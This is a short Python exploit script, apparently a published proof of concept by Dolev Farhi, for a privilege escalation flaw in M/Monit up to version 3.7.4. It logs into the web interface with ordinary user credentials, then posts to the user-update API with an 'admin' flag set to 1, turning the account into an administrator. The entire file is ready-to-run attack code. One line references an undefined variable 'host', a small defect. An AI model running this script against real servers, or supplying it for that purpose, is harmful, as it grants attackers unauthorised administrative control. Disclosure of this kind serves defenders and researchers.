"""
Vulnerability title: M/Monit <= 3.7.4 - Privilege Escalation
Author: Dolev Farhi
Vulnerable version: 3.7.4
Link: https://mmonit.com
Date: 9/7/2020
"""

import sys
import requests

url = 'http://your_ip_here:8080'
username = 'test'
password = 'test123'

sess = requests.Session()
sess.get(host)

def login():
  print('Attempting to login...')
  data = {
    'z_username':username,
    'z_password':password
  }
  headers = {
    'Content-Type':'application/x-www-form-urlencoded'
  }
 
  resp = sess.post(url + '/z_security_check', data=data, headers=headers)
  if resp.ok:
    print('Logged in successfully.')
  else:
    print('Could not login.')
    sys.exit(1)

def privesc():
  data = {
    'uname':username,
    'fullname':username,
    'password':password,
    'admin':1
  }
  resp = sess.post(url + '/api/1/admin/users/update', data=data)
 
  if resp.ok:
    print('Escalated to administrator.')
  else:
    print('Unable to escalate to administrator.')
 
  return

if __name__ == '__main__':
  login()
  privesc()
